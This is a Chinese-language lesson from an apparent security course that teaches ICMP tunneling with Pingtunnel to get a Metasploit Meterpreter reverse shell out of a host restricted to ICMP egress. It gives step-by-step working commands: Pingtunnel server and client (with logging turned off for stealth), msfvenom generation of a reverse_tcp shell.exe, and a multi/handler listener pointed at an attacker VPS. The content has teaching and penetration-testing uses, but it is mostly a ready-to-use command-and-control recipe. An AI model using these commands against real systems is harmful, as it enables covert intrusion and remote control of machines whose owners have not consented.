# 网络安全系统教程：P81：ICMP隧道技术详解

在本节课中，我们将要学习如何利用ICMP隧道技术，在目标主机仅允许ICMP协议出网的限制下，实现TCP流量的转发并成功上线Metasploit框架。这是一种在严格网络环境中建立命令与控制通道的有效方法。

## 隧道技术概述

上一节我们介绍了HTTP隧道和DNS隧道，本节中我们来看看ICMP隧道。隧道技术的主要作用是在网络协议受限的环境中，建立隐蔽的通信通道。

以下是三种常见隧道技术的作用场景：

*   **HTTP隧道**：当目标主机只能通过80端口（HTTP协议）访问外网时，我们可以利用HTTP隧道。通过在服务端和客户端运行特定脚本，建立一个看似正常的HTTP通信代理通道，从而传输其他协议的数据。
*   **DNS隧道**：当目标网络禁止直接的TCP/UDP连接，但允许DNS查询（53端口）时，可以利用DNS隧道。因为域名解析是网络访问的基础需求，防火墙通常不会完全阻断。我们可以将数据封装在DNS查询和响应包中进行传输。
*   **ICMP隧道**：当目标主机严格到只允许ICMP协议（如ping命令）出网时，前面两种方法可能失效。此时，我们可以利用ICMP隧道，将TCP等协议的数据封装在ICMP协议的`echo request`和`echo reply`数据包中进行传输。

### 场景一：转发TCP流量上线MSF

![](img/25c24934f4df4a5b427569aae369eadf_20.png)

本场景的目标是：在目标机器（客户端）上执行一个MSF生成的反向TCP负载（Payload），但该机器的TCP流量无法直接到达我们的MSF服务器。我们通过Pingtunnel建立的ICMP隧道，将TCP连接请求“偷渡”出去。

![](img/25c24934f4df4a5b427569aae369eadf_22.png)

![](img/25c24934f4df4a5b427569aae369eadf_23.png)

![](img/25c24934f4df4a5b427569aae369eadf_25.png)

整个流程的核心公式可以概括为：
`目标机执行Payload -> 连接本地Pingtunnel客户端监听的端口 -> Pingtunnel客户端通过ICMP隧道将数据转发至VPS上的服务端 -> Pingtunnel服务端将数据还原并转发至MSF监听端口 -> MSF获得Shell`

#### 第一步：启动ICMP隧道服务端

![](img/25c24934f4df4a5b427569aae369eadf_27.png)

服务端需要部署在具有公网IP的VPS上。使用以下命令启动服务端：

![](img/25c24934f4df4a5b427569aae369eadf_29.png)

![](img/25c24934f4df4a5b427569aae369eadf_31.png)

```bash
./pingtunnel -type server
```
*   `-type server`：指定运行模式为服务端。

执行后，服务端会开始等待客户端的ICMP连接。此时使用`ping`命令测试VPS的IP，可以在服务端看到相应的日志，表明ICMP通信正常。

![](img/25c24934f4df4a5b427569aae369eadf_33.png)

![](img/25c24934f4df4a5b427569aae369eadf_35.png)

#### 第二步：在目标机启动ICMP隧道客户端

![](img/25c24934f4df4a5b427569aae369eadf_37.png)

![](img/25c24934f4df4a5b427569aae369eadf_39.png)

![](img/25c24934f4df4a5b427569aae369eadf_41.png)

在目标机器（内网受限主机）上，使用以下命令启动Pingtunnel客户端：

![](img/25c24934f4df4a5b427569aae369eadf_43.png)

```bash
./pingtunnel -type client -l 127.0.0.1:9999 -s <VPS_IP> -t <VPS_IP>:7777 -tcp 1 -noprint -nolog
```
以下是参数详解：
*   `-type client`：指定运行模式为客户端。
*   `-l 127.0.0.1:9999`：在客户端本地监听9999端口。
*   `-s <VPS_IP>`：指定服务端的IP地址（即你的VPS地址）。
*   `-t <VPS_IP>:7777`：指定最终要转发的目标地址和端口。这里我们将流量转发到VPS的7777端口。
*   `-tcp 1`：启用TCP协议转发（默认为0关闭）。
*   `-noprint -nolog`：不打印和记录日志，保持隐蔽。

![](img/25c24934f4df4a5b427569aae369eadf_44.png)

![](img/25c24934f4df4a5b427569aae369eadf_46.png)

![](img/25c24934f4df4a5b427569aae369eadf_48.png)

执行此命令后，客户端会通过ICMP协议与服务端建立连接。此时在服务端可以看到持续的ICMP请求，表明隧道已建立。

#### 第三步：生成并配置MSF Payload

![](img/25c24934f4df4a5b427569aae369eadf_50.png)

![](img/25c24934f4df4a5b427569aae369eadf_52.png)

关键的一步是生成特制的MSF Payload。这个Payload不能直接连接VPS的MSF端口，而应该连接**客户端本地的Pingtunnel监听端口**。

![](img/25c24934f4df4a5b427569aae369eadf_54.png)

使用`msfvenom`生成Payload：
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=9999 -f exe -o shell.exe
```
请注意这里的 `LHOST=127.0.0.1` 和 `LPORT=9999`。这意味着生成的`shell.exe`在执行时，会尝试向本机（目标机）的9999端口发起TCP连接。

![](img/25c24934f4df4a5b427569aae369eadf_56.png)

![](img/25c24934f4df4a5b427569aae369eadf_57.png)

![](img/25c24934f4df4a5b427569aae369eadf_59.png)

#### 第四步：启动MSF监听器

![](img/25c24934f4df4a5b427569aae369eadf_61.png)

![](img/25c24934f4df4a5b427569aae369eadf_63.png)

在VPS上启动Metasploit，设置监听器。**监听地址应为VPS的IP，监听端口需要与Pingtunnel客户端命令中`-t`参数指定的转发目标端口一致**（本例中为7777）。

![](img/25c24934f4df4a5b427569aae369eadf_65.png)

![](img/25c24934f4df4a5b427569aae369eadf_67.png)

在MSF控制台中执行：
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <VPS_IP>  # 这里填写VPS的真实IP
set LPORT 7777       # 与Pingtunnel客户端 `-t` 参数中的端口一致
exploit -j
```

![](img/25c24934f4df4a5b427569aae369eadf_69.png)

![](img/25c24934f4df4a5b427569aae369eadf_71.png)

#### 第五步：执行Payload并获取Shell

![](img/25c24934f4df4a5b427569aae369eadf_73.png)

![](img/25c24934f4df4a5b427569aae369eadf_74.png)

![](img/25c24934f4df4a5b427569aae369eadf_76.png)

1.  将生成的`shell.exe`上传到目标机器并执行。
2.  `shell.exe`执行后，会向`127.0.0.1:9999`发起TCP连接。
3.  本地的Pingtunnel客户端（监听在9999端口）接收到这个连接。
4.  客户端通过已建立的ICMP隧道，将TCP数据包加密并发送给VPS上的Pingtunnel服务端。
5.  服务端解密数据包，并将其还原为原始的TCP连接请求，转发至`<VPS_IP>:7777`。
6.  正在监听7777端口的MSF处理程序接收到此连接，成功建立Meterpreter会话。

![](img/25c24934f4df4a5b427569aae369eadf_77.png)

![](img/25c24934f4df4a5b427569aae369eadf_79.png)

至此，我们成功绕过了目标机对TCP/UDP协议的限制，通过ICMP隧道获得了反向Shell。

![](img/25c24934f4df4a5b427569aae369eadf_81.png)
